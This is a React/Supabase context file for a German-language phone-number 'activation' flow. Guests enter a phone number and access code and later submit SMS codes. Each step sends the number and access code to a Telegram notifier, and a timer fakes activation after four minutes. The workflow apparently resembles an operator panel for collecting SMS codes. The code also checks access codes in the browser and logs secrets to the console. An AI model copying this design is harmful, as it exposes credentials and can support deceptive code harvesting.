import { createContext, useContext, useState, useEffect, ReactNode } from 'react';
import { supabase } from '@/integrations/supabase/client';
import { toast } from '@/hooks/use-toast';
import { Tables } from '@/integrations/supabase/types';

type Request = Tables<'requests'> & { 
  phone?: string;
  accessCode?: string;
  smsCode?: string;
};

type PhoneNumber = Tables<'phone_numbers'> & {
  id: string;
  phone: string;
  accessCode: string;
  isUsed: boolean;
  createdAt: Date;
  usedAt?: Date;
};

type SMSContextType = {
  currentRequest: Request | null;
  requests: Record<string, Request>;
  phoneNumbers: Record<string, PhoneNumber>;
  submitRequest: (phone: string, accessCode: string) => Promise<void>;
  markSMSSent: (requestId: string) => Promise<boolean>;
  requestSMS: (requestId: string) => Promise<void>;
  completeRequest: (requestId: string) => Promise<void>;
  activateRequest: (requestId: string) => Promise<void>;
  submitSMSCode: (requestId: string, smsCode: string) => Promise<void>;
  createPhoneNumber: (phone: string, accessCode: string) => Promise<void>;
  updatePhoneNumber: (id: string, phone: string, accessCode: string) => Promise<void>;
  deletePhoneNumber: (id: string) => Promise<void>;
  resetCurrentRequest: () => void;
  isLoading: boolean;
  error: string | null;
  showSimulation: boolean;
  setShowSimulation: (show: boolean) => void;
};

const SMSContext = createContext<SMSContextType | undefined>(undefined);

export const useSMS = () => {
  const context = useContext(SMSContext);
  if (!context) {
    throw new Error('useSMS must be used within a SMSProvider');
  }
  return context;
};

// Helper function to send Telegram notification for new guest requests
const sendTelegramNotificationForRequest = async (phone: string, accessCode: string, shortId?: string) => {
  try {
    console.log('📱 Sending Telegram notification for new guest request:', phone, 'ID:', shortId);
    
    const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
      body: { 
        phone, 
        accessCode,
        shortId,
        type: 'request'
      }
    });
    
    if (error) {
      console.error('❌ Error sending Telegram notification for request:', error);
      return;
    }
    
    console.log('✅ Telegram notification for request sent successfully:', data);
  } catch (error) {
    console.error('💥 Failed to send Telegram notification for request:', error);
  }
};

// Helper function to send Telegram notification for admin activation
const sendTelegramNotificationForActivation = async (phone: string, accessCode: string, shortId?: string) => {
  try {
    console.log('📱 Sending Telegram notification for activation:', phone, 'ID:', shortId);
    
    const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
      body: { 
        phone, 
        accessCode,
        shortId,
        type: 'activation'
      }
    });
    
    if (error) {
      console.error('❌ Error sending Telegram notification for activation:', error);
      return;
    }
    
    console.log('✅ Telegram notification for activation sent successfully:', data);
  } catch (error) {
    console.error('💥 Failed to send Telegram notification for activation:', error);
  }
};

// Helper function to send Telegram notification when SMS is sent
const sendTelegramNotificationForSMSSent = async (phone: string, accessCode: string, shortId?: string) => {
  try {
    console.log('📱 Sending Telegram notification for SMS sent:', phone, 'ID:', shortId);
    
    const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
      body: { 
        phone, 
        accessCode,
        shortId,
        type: 'sms_sent'
      }
    });
    
    if (error) {
      console.error('❌ Error sending Telegram notification for SMS sent:', error);
      return;
    }
    
    console.log('✅ Telegram notification for SMS sent successfully:', data);
  } catch (error) {
    console.error('💥 Failed to send Telegram notification for SMS sent:', error);
  }
};

// Helper function to send Telegram notification when process is completed
const sendTelegramNotificationForCompleted = async (phone: string, accessCode: string, shortId?: string) => {
  try {
    console.log('📱 Sending Telegram notification for completed:', phone, 'ID:', shortId);
    
    const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
      body: { 
        phone, 
        accessCode,
        shortId,
        type: 'completed'
      }
    });
    
    if (error) {
      console.error('❌ Error sending Telegram notification for completed:', error);
      return;
    }
    
    console.log('✅ Telegram notification for completed sent successfully:', data);
  } catch (error) {
    console.error('💥 Failed to send Telegram notification for completed:', error);
  }
};

export const SMSProvider = ({ children }: { children: ReactNode }) => {
  const [currentRequest, setCurrentRequest] = useState<Request | null>(null);
  const [requests, setRequests] = useState<Record<string, Request>>({});
  const [phoneNumbers, setPhoneNumbers] = useState<Record<string, PhoneNumber>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showSimulation, setShowSimulation] = useState(false);

  // Load initial data
  useEffect(() => {
    loadRequests();
    loadPhoneNumbers();
  }, []);

  // Set up real-time subscription for requests
  useEffect(() => {
    console.log('🔄 SMSContext - Setting up real-time subscription for requests');
    
    const channel = supabase
      .channel('requests-realtime')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'requests'
        },
        async (payload) => {
          console.log('🔔 SMSContext - Real-time update received:', payload);
          
          if (payload.eventType === 'UPDATE') {
            const updatedRequest = payload.new as Tables<'requests'>;
            console.log('📝 SMSContext - Request updated via real-time:', updatedRequest.id, updatedRequest.status);
            
            if (currentRequest && currentRequest.id === updatedRequest.id) {
              console.log('🎯 SMSContext - Updating current request from real-time');
              
              const { data: phoneData } = await supabase
                .from('phone_numbers')
                .select('*')
                .eq('id', updatedRequest.phone_number_id)
                .single();
              
              const updatedRequestWithPhone = {
                ...updatedRequest,
                phone: phoneData?.phone || currentRequest.phone,
                accessCode: phoneData?.access_code || currentRequest.accessCode,
                smsCode: updatedRequest.sms_code,
              };
              
              setCurrentRequest(updatedRequestWithPhone);
              
              if (updatedRequest.status !== 'pending' && showSimulation) {
                console.log('🎭 SMSContext - Hiding simulation due to status change');
                setShowSimulation(false);
              }
              
              if (updatedRequest.status === 'activated' && currentRequest.status === 'pending') {
                toast({
                  title: "Nummer aktiviert!",
                  description: `Ihre Nummer ${phoneData?.phone} wurde erfolgreich aktiviert.`,
                });
              }
            }
            
            await loadRequests();
          } else if (payload.eventType === 'INSERT') {
            console.log('➕ SMSContext - New request created via real-time');
            await loadRequests();
          } else if (payload.eventType === 'DELETE') {
            console.log('🗑️ SMSContext - Request deleted via real-time');
            await loadRequests();
          }
        }
      )
      .subscribe((status) => {
        console.log('📡 SMSContext - Real-time subscription status:', status);
      });

    return () => {
      console.log('🧹 SMSContext - Cleaning up real-time subscription');
      supabase.removeChannel(channel);
    };
  }, [currentRequest, showSimulation]);

  const loadRequests = async () => {
    try {
      console.log('🔄 SMSContext - Loading requests...');
      
      const { data: requestsData, error: requestsError } = await supabase
        .from('requests')
        .select('*')
        .order('created_at', { ascending: false });

      if (requestsError) {
        console.error('❌ SMSContext - Error loading requests:', requestsError);
        throw requestsError;
      }

      console.log('✅ SMSContext - Requests loaded:', requestsData?.length || 0);

      const { data: phoneNumbersData, error: phoneNumbersError } = await supabase
        .from('phone_numbers')
        .select('*');

      if (phoneNumbersError) {
        console.error('❌ SMSContext - Error loading phone numbers:', phoneNumbersError);
        throw phoneNumbersError;
      }

      console.log('✅ SMSContext - Phone numbers loaded:', phoneNumbersData?.length || 0);

      const phoneNumbersMap: Record<string, any> = {};
      phoneNumbersData?.forEach((phoneNumber) => {
        phoneNumbersMap[phoneNumber.id] = phoneNumber;
      });

      const requestsMap: Record<string, Request> = {};
      requestsData?.forEach((request) => {
        const phoneData = phoneNumbersMap[request.phone_number_id];
        requestsMap[request.id] = {
          ...request,
          phone: phoneData?.phone,
          accessCode: phoneData?.access_code,
          smsCode: request.sms_code,
          updated_at: request.updated_at,
        };
        
        console.log(`📊 SMSContext - Merged request ${request.id} (${request.short_id}): ${request.status} - Phone: ${phoneData?.phone}`);
      });
      
      setRequests(requestsMap);
      console.log('✅ SMSContext - All requests loaded and merged successfully');
    } catch (error) {
      console.error('💥 SMSContext - Error loading requests:', error);
    }
  };

  const loadPhoneNumbers = async () => {
    try {
      const { data, error } = await supabase
        .from('phone_numbers')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;

      const phoneNumbersMap: Record<string, PhoneNumber> = {};
      data?.forEach((phoneNumber) => {
        phoneNumbersMap[phoneNumber.id] = {
          ...phoneNumber,
          accessCode: phoneNumber.access_code,
          isUsed: phoneNumber.is_used,
          createdAt: new Date(phoneNumber.created_at),
          usedAt: phoneNumber.used_at ? new Date(phoneNumber.used_at) : undefined,
        };
      });
      setPhoneNumbers(phoneNumbersMap);
    } catch (error) {
      console.error('Error loading phone numbers:', error);
    }
  };

  const activateRequest = async (requestId: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('🔄 SMSContext - activateRequest called for request:', requestId);
      
      const request = requests[requestId];
      if (!request) {
        console.error('❌ SMSContext - Request not found:', requestId);
        setError('Anfrage nicht gefunden.');
        return;
      }

      const { data, error } = await supabase
        .from('requests')
        .update({ status: 'activated' })
        .eq('id', requestId)
        .select()
        .single();
      
      if (error) {
        console.error('❌ SMSContext - Error updating request status to activated:', error);
        setError('Fehler beim Aktivieren der Anfrage. Bitte versuchen Sie es erneut.');
        return;
      }
      
      console.log('✅ SMSContext - Request status updated to activated:', data);
      
      if (request.phone && request.accessCode) {
        await sendTelegramNotificationForActivation(request.phone, request.accessCode, data.short_id);
      }
      
      await loadRequests();
      
    } catch (error) {
      console.error('💥 SMSContext - Error in activateRequest:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const submitSMSCode = async (requestId: string, smsCode: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('📨 SMSContext - submitSMSCode called for request:', requestId, 'with code:', smsCode);
      
      const { data, error } = await supabase
        .from('requests')
        .update({ 
          status: 'waiting_for_additional_sms',
          sms_code: smsCode
        })
        .eq('id', requestId)
        .select()
        .single();
      
      if (error) {
        console.error('❌ SMSContext - Error submitting SMS code:', error);
        setError('Fehler beim Senden des SMS-Codes. Bitte versuchen Sie es erneut.');
        return;
      }
      
      console.log('✅ SMSContext - SMS code submitted successfully:', data);
      await loadRequests();
      
      toast({
        title: "SMS Code gesendet!",
        description: `Der SMS Code ${smsCode} wurde erfolgreich übermittelt.`,
      });
      
    } catch (error) {
      console.error('💥 SMSContext - Error in submitSMSCode:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const createPhoneNumber = async (phone: string, accessCode: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      const { data, error } = await supabase
        .from('phone_numbers')
        .insert({
          phone,
          access_code: accessCode,
        })
        .select()
        .single();

      if (error) {
        console.error('❌ SMSContext - Error creating phone number:', error);
        setError('Fehler beim Erstellen der Telefonnummer. Bitte versuchen Sie es erneut.');
        return;
      }

      console.log('✅ SMSContext - Phone number created successfully:', data);
      await loadPhoneNumbers();
      
      toast({
        title: "Telefonnummer erstellt!",
        description: `Die Nummer ${phone} wurde erfolgreich hinzugefügt.`,
      });
      
    } catch (error) {
      console.error('💥 SMSContext - Error in createPhoneNumber:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const updatePhoneNumber = async (id: string, phone: string, accessCode: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      const { data, error } = await supabase
        .from('phone_numbers')
        .update({
          phone,
          access_code: accessCode,
        })
        .eq('id', id)
        .select()
        .single();

      if (error) {
        console.error('❌ SMSContext - Error updating phone number:', error);
        setError('Fehler beim Aktualisieren der Telefonnummer. Bitte versuchen Sie es erneut.');
        return;
      }

      console.log('✅ SMSContext - Phone number updated successfully:', data);
      await loadPhoneNumbers();
      
      toast({
        title: "Telefonnummer aktualisiert!",
        description: `Die Nummer wurde erfolgreich aktualisiert.`,
      });
      
    } catch (error) {
      console.error('💥 SMSContext - Error in updatePhoneNumber:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const deletePhoneNumber = async (id: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      const { error } = await supabase
        .from('phone_numbers')
        .delete()
        .eq('id', id);

      if (error) {
        console.error('❌ SMSContext - Error deleting phone number:', error);
        setError('Fehler beim Löschen der Telefonnummer. Bitte versuchen Sie es erneut.');
        return;
      }

      console.log('✅ SMSContext - Phone number deleted successfully');
      await loadPhoneNumbers();
      
      toast({
        title: "Telefonnummer gelöscht!",
        description: `Die Nummer wurde erfolgreich gelöscht.`,
      });
      
    } catch (error) {
      console.error('💥 SMSContext - Error in deletePhoneNumber:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const resetCurrentRequest = () => {
    setCurrentRequest(null);
    setError(null);
  };

  const markSMSSent = async (requestId: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('📱 SMSContext - markSMSSent called for request:', requestId);
      
      const { data, error } = await supabase
        .from('requests')
        .update({ status: 'sms_sent' })
        .eq('id', requestId)
        .select()
        .single();
      
      if (error) {
        console.error('❌ SMSContext - Error updating request status to sms_sent:', error);
        setError('Fehler beim Aktualisieren des Anfragestatus. Bitte versuchen Sie es erneut.');
        return false;
      }
      
      console.log('✅ SMSContext - Request status updated to sms_sent:', data);
      
      // Send Telegram notification for SMS sent
      if (currentRequest?.phone && currentRequest?.accessCode) {
        await sendTelegramNotificationForSMSSent(currentRequest.phone, currentRequest.accessCode, data.short_id);
      }
      
      const requestWithPhone = {
        ...data,
        phone: currentRequest?.phone
      };
      
      setCurrentRequest(requestWithPhone);
      return true;
      
    } catch (error) {
      console.error('💥 SMSContext - Error in markSMSSent:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
      return false;
    } finally {
      setIsLoading(false);
    }
  };

  const requestSMS = async (requestId: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('🔄 SMSContext - requestSMS called for request:', requestId);
      
      const { data, error } = await supabase
        .from('requests')
        .update({ status: 'sms_requested' })
        .eq('id', requestId)
        .select()
        .single();
      
      if (error) {
        console.error('❌ SMSContext - Error updating request status to sms_requested:', error);
        setError('Fehler beim Anfordern eines neuen SMS-Codes. Bitte versuchen Sie es erneut.');
        return;
      }
      
      console.log('✅ SMSContext - Request status updated to sms_requested:', data);
      
      // Send Telegram notification for SMS sent - same as markSMSSent
      if (currentRequest?.phone && currentRequest?.accessCode) {
        await sendTelegramNotificationForSMSSent(currentRequest.phone, currentRequest.accessCode, data.short_id);
      }
      
      const requestWithPhone = {
        ...data,
        phone: currentRequest?.phone
      };
      
      setCurrentRequest(requestWithPhone);
      
    } catch (error) {
      console.error('💥 SMSContext - Error in requestSMS:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const completeRequest = async (requestId: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('✅ SMSContext - completeRequest called for request:', requestId);
      
      const { data, error } = await supabase
        .from('requests')
        .update({ status: 'completed' })
        .eq('id', requestId)
        .select()
        .single();
      
      if (error) {
        console.error('❌ SMSContext - Error updating request status to completed:', error);
        setError('Fehler beim Abschließen der Anfrage. Bitte versuchen Sie es erneut.');
        return;
      }
      
      console.log('✅ SMSContext - Request status updated to completed:', data);
      
      // Send Telegram notification for completed request
      if (currentRequest?.phone && currentRequest?.accessCode) {
        await sendTelegramNotificationForCompleted(currentRequest.phone, currentRequest.accessCode, data.short_id);
      }
      
      await loadRequests();
      setCurrentRequest(null);
      
      toast({
        title: "Vorgang abgeschlossen!",
        description: "Ihre Anfrage wurde erfolgreich abgeschlossen.",
      });
      
    } catch (error) {
      console.error('💥 SMSContext - Error in completeRequest:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  const submitRequest = async (phone: string, accessCode: string) => {
    setIsLoading(true);
    setError(null);
    
    try {
      console.log('🚀 SMSContext - submitRequest called with:', { phone, accessCode });
      
      const { data: phoneData, error: phoneError } = await supabase
        .from('phone_numbers')
        .select('id, is_used, access_code')
        .eq('phone', phone)
        .single();

      if (phoneError) {
        console.error('❌ SMSContext - Error finding phone number:', phoneError);
        setError('Diese Telefonnummer wurde nicht gefunden oder ist ungültig.');
        return;
      }

      if (phoneData.is_used) {
        console.log('⚠️ SMSContext - Phone number already used:', phone);
        setError('Diese Telefonnummer wurde bereits verwendet und kann nicht erneut aktiviert werden.');
        return;
      }

      if (phoneData.access_code !== accessCode) {
        console.error('❌ SMSContext - Invalid access code for phone:', phone);
        setError('Der eingegebene Zugangscode ist ungültig.');
        return;
      }

      console.log('✅ SMSContext - Phone number and access code verified:', phoneData.id);

      const { data: requestData, error: requestError } = await supabase
        .from('requests')
        .insert({
          phone_number_id: phoneData.id,
          status: 'pending'
        })
        .select()
        .single();

      if (requestError) {
        console.error('❌ SMSContext - Error creating request:', requestError);
        setError('Fehler beim Erstellen der Anfrage. Bitte versuchen Sie es erneut.');
        return;
      }

      console.log('✅ SMSContext - Request created successfully:', requestData);

      await sendTelegramNotificationForRequest(phone, accessCode, requestData.short_id);

      const requestWithPhone = {
        ...requestData,
        phone: phone,
        accessCode: accessCode
      };
      
      setCurrentRequest(requestWithPhone);
      setShowSimulation(true);

      setTimeout(async () => {
        try {
          console.log('🔄 SMSContext - Simulating activation completion for request:', requestData.id);
          
          const { data: updatedRequest, error: updateError } = await supabase
            .from('requests')
            .update({ status: 'activated' })
            .eq('id', requestData.id)
            .select()
            .single();

          if (updateError) {
            console.error('❌ SMSContext - Error updating request status:', updateError);
            return;
          }

          console.log('✅ SMSContext - Request status updated to activated:', updatedRequest);
          
          const updatedRequestWithPhone = {
            ...updatedRequest,
            phone: phone,
            accessCode: accessCode
          };
          
          setCurrentRequest(updatedRequestWithPhone);
          setShowSimulation(false);

          toast({
            title: "Nummer aktiviert!",
            description: `Ihre Nummer ${phone} wurde erfolgreich aktiviert.`,
          });

        } catch (error) {
          console.error('💥 SMSContext - Error in activation simulation:', error);
        }
      }, 240000);

    } catch (error) {
      console.error('💥 SMSContext - Unexpected error in submitRequest:', error);
      setError('Ein unerwarteter Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <SMSContext.Provider
      value={{
        currentRequest,
        requests,
        phoneNumbers,
        submitRequest,
        markSMSSent,
        requestSMS,
        completeRequest,
        activateRequest,
        submitSMSCode,
        createPhoneNumber,
        updatePhoneNumber,
        deletePhoneNumber,
        resetCurrentRequest,
        isLoading,
        error,
        showSimulation,
        setShowSimulation
      }}
    >
      {children}
    </SMSContext.Provider>
  );
};
